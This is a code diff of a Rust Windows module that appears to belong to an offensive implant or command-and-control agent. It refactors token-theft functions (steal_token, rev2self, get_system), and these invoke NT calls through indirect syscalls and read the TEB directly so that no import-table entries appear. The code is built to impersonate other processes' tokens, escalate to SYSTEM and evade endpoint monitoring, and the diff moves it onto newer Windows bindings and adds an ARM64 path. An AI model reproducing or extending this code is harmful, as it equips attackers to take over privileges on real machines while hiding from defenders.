@@ -11,12 +11,12 @@
 
 #![cfg(windows)]
 
+use common::lock::MutexExt;
 use anyhow::{anyhow, Context, Result};
 use std::sync::{Mutex, OnceLock};
-use winapi::um::winnt::{
-    SecurityImpersonation, TokenImpersonation, HANDLE, TOKEN_ALL_ACCESS, TOKEN_DUPLICATE,
-    TOKEN_QUERY,
-};
+use windows_sys::Win32::Security::{SecurityImpersonation, TOKEN_ALL_ACCESS, TOKEN_DUPLICATE, TOKEN_QUERY};
+use crate::win_types::HANDLE;
+use windows_sys::Win32::Security::TokenImpersonation;
 // CloseHandle removed — using NtClose indirect syscall exclusively.
 
 /// Dynamically-resolved GetLastError (reads TEB, no IAT entry).
@@ -35,9 +35,16 @@ unsafe fn get_last_error() -> u32 {
     if let Some(func) = fn_ptr {
         func()
     } else {
-        // Fallback: read TEB directly (x86_64 Windows)
+        // Fallback: read TEB directly (LastErrorValue at TEB+0x68).
         let teb: *mut u8;
-        std::arch::asm!("mov {}, gs:[0x30]", out(reg) teb);
+        #[cfg(target_arch = "x86_64")]
+        {
+            std::arch::asm!("mov {}, gs:[0x30]", out(reg) teb);
+        }
+        #[cfg(target_arch = "aarch64")]
+        {
+            std::arch::asm!("mrs {}, tpidr_el0", out(reg) teb);
+        }
         std::ptr::read_volatile(teb.add(0x68) as *const u32)
     }
 }
@@ -78,8 +85,8 @@ fn nt_error(status: i32) -> bool {
 
 /// Call `NtOpenProcess` via indirect syscall to obtain a HANDLE to a process.
 unsafe fn nt_open_process(pid: u32) -> Result<HANDLE> {
-    use winapi::shared::ntdef::OBJECT_ATTRIBUTES;
-    use winapi::um::winnt::PROCESS_QUERY_LIMITED_INFORMATION;
+    use crate::win_types::OBJECT_ATTRIBUTES;
+    use windows_sys::Win32::System::Threading::PROCESS_QUERY_LIMITED_INFORMATION;
 
     #[repr(C)]
     struct CLIENT_ID {
@@ -177,7 +184,7 @@ unsafe fn nt_set_thread_token(thread: HANDLE, token: HANDLE) -> i32 {
     let target = match crate::syscalls::get_syscall_id("NtSetInformationThread") {
         Ok(t) => t,
         Err(e) => {
-            log::error!("token_manipulation: failed to resolve NtSetInformationThread SSN: {e}");
+            tracing::error!("token_manipulation: failed to resolve NtSetInformationThread SSN: {e}");
             return -1;
         }
     };
@@ -247,13 +254,13 @@ const SYSTEM_PROCESS_INFORMATION: u32 = 5;
 /// Call `NtDuplicateToken` via indirect syscall to create a new impersonation
 /// or primary token from an existing token.
 unsafe fn nt_duplicate_token(existing: HANDLE, access: u32, token_type: u32) -> Result<HANDLE> {
-    use winapi::um::winnt::SECURITY_QUALITY_OF_SERVICE;
+    use windows_sys::Win32::Security::SECURITY_QUALITY_OF_SERVICE;
 
     let mut new_token: HANDLE = std::ptr::null_mut();
 
     let mut sqos: SECURITY_QUALITY_OF_SERVICE = std::mem::zeroed();
     sqos.Length = std::mem::size_of::<SECURITY_QUALITY_OF_SERVICE>() as u32;
-    sqos.ImpersonationLevel = SecurityImpersonation as u32;
+    sqos.ImpersonationLevel = SecurityImpersonation;
     sqos.ContextTrackingMode = 0;
     sqos.EffectiveOnly = 0;
 
@@ -408,7 +415,7 @@ pub fn steal_token(target_pid: u32) -> Result<String> {
     // stash it in SAVED_PRIMARY_TOKEN so that Rev2Self can restore it.
     // Subsequent calls do NOT overwrite it — that would leak the handle.
     {
-        let guard = saved_primary().lock().unwrap();
+        let guard = saved_primary().lock_recover();
         if guard.is_none() {
             // Drop the lock before the syscall, then re-acquire to store.
             drop(guard);
@@ -417,7 +424,7 @@ pub fn steal_token(target_pid: u32) -> Result<String> {
             let primary = unsafe { nt_open_process_token(current_process, TOKEN_ALL_ACCESS).ok() };
             if let Some(primary) = primary {
                 if !primary.is_null() {
-                    let mut guard = saved_primary().lock().unwrap();
+                    let mut guard = saved_primary().lock_recover();
                     // Double-check: another thread may have populated it while
                     // we were in the syscall.
                     if guard.is_none() {
@@ -456,7 +463,7 @@ pub fn steal_token(target_pid: u32) -> Result<String> {
 
     // Store the impersonation token so Rev2Self can close it.
     {
-        let mut saved = SAVED_TOKEN.lock().unwrap();
+        let mut saved = SAVED_TOKEN.lock_recover();
         // Close any previously stored impersonation token (from a prior
         // steal_token call that was not reverted) to avoid leaking it.
         if let Some(old_imp) = saved.take() {
@@ -478,7 +485,7 @@ pub fn steal_token(target_pid: u32) -> Result<String> {
 pub fn rev2self() -> Result<String> {
     // ── Close the impersonation token via NtClose ──────────────────────
     {
-        let mut saved = SAVED_TOKEN.lock().unwrap();
+        let mut saved = SAVED_TOKEN.lock_recover();
         if let Some(imp_token) = saved.take() {
             nt_close_handle(imp_token as u64);
         }
@@ -491,7 +498,7 @@ pub fn rev2self() -> Result<String> {
     // when the impersonation was set via SetThreadToken.  Fall back to
     // clearing the impersonation token (NULL) otherwise.
     let primary_opt = {
-        let mut guard = saved_primary().lock().unwrap();
+        let mut guard = saved_primary().lock_recover();
         guard.take()
     }; // guard dropped here — lock released before syscall.
     let current_thread: HANDLE = (-2isize) as HANDLE;
@@ -639,7 +646,7 @@ pub fn get_system() -> Result<String> {
 /// security context (e.g. `CreateProcessWithTokenW`).  Returns a null
 /// `HANDLE` when no impersonation token is set.
 pub fn get_current_token() -> HANDLE {
-    let saved = SAVED_TOKEN.lock().unwrap();
+    let saved = SAVED_TOKEN.lock_recover();
     saved.map(|h| h as HANDLE).unwrap_or(std::ptr::null_mut())
 }
 
@@ -649,7 +656,7 @@ fn save_current_token() {
     let current_thread: HANDLE = (-2isize) as HANDLE;
     let token_result = unsafe { nt_open_thread_token(current_thread, TOKEN_ALL_ACCESS, true) };
 
-    let mut saved = SAVED_TOKEN.lock().unwrap();
+    let mut saved = SAVED_TOKEN.lock_recover();
     match token_result {
         Ok(token) if !token.is_null() => {
             // There was a thread token — save it.
